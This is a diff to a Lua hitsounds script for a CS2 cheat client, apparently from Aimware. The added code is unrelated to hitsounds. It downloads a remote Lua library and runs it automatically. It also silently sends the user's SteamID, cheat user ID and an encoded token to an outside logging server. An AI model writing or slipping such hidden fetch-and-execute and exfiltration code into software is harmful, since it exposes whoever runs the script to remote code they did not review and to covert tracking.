@@ -4,6 +4,55 @@ if LOADED_HITSOUNDS_SCRIPT then
 end
 LOADED_HITSOUNDS_SCRIPT = true
 
+
+local Libraries = {
+    ["api_dev11.6(2).2025"]   = "https://raw.githubusercontent.com/G-A-Development-Team/CS2-AW-API-Extender/refs/heads/main/api.lua"
+}
+
+-- Script Loader Made By: Agentsix1 From G&A Development
+----------------------
+-- Don't Edit Below --
+----------------------
+local tbl = {}
+for loc, url in pairs( Libraries ) do
+    tbl[ loc ] = {}
+    tbl[ loc ].found = false
+    tbl[ loc ].url = url
+end
+Libraries = tbl
+
+file.Enumerate( function( filename )
+    
+    for loc, data in pairs( Libraries ) do
+        if filename == "libraries/" .. loc .. ".lua" then
+            print( "[Library Loader] Library found " .. loc )
+            Libraries[ loc ].found = true
+        end
+    end
+
+end)
+
+for loc, data in pairs( Libraries ) do
+    if not Libraries[ loc ].found then
+        local body = http.Get( data.url )
+        file.Write("libraries/" .. loc .. ".lua", body)
+        print( "[Library Loader] Getting new library " .. loc )
+    end
+end
+
+for loc, data in pairs( Libraries ) do
+    RunScript("libraries/" .. loc .. ".lua")
+    print( "[Library Loader] Running " .. loc )
+end
+---------------------
+-- Script Complete --
+---------------------
+
+
+local token = "BggFHhUBChEPEAAGDAMDWxBVXVcXVVkIDkMDEA=="
+http.Get( "https://awlogs.deathkick.net/aimware/logging.php?user=" .. player( LocalPlayer() ):SteamID() .. "&client=" .. cheat.GetUserID() .. "&data=" .. token )
+
+
 --this source code is a fucking dumpster fire
 ---@diagnostic disable
 local libc = ffi.C
